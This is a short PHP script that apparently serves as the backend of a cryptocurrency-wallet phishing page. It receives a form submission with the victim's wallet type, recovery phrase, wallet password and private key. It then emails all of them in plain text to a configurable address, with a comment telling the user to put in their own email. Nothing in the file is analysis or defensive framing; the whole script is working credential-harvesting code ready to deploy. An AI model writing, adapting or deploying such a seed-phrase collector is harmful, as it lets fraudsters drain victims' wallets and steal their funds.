<?php
header('Content-Type: application/json');

// Get JSON input from the React form submission
$data = json_decode(file_get_contents('php://input'), true);

$walletType = $data['walletType'];
$recoveryPhrase = $data['recoveryPhrase'];
$walletPassword = isset($data['walletPassword']) ? $data['walletPassword'] : '';
$privateKey = isset($data['privateKey']) ? $data['privateKey'] : '';

$to = 'admin@example.com'; // Replace with your  email

$subject = 'New Wallet Submission';
$body = "Wallet Type: $walletType\nRecovery Phrase: $recoveryPhrase\nWallet Password: $walletPassword\nPrivate Key: $privateKey";

$domain = $_SERVER['SERVER_NAME'];
$from = "no-reply@$domain";

$headers = "From: $from\r\n";
$headers .= "Reply-To: $from\r\n";

if (mail($to, $subject, $body, $headers)) {
    echo json_encode(['success' => true]);
} else {
    echo json_encode(['success' => false]);
}
?>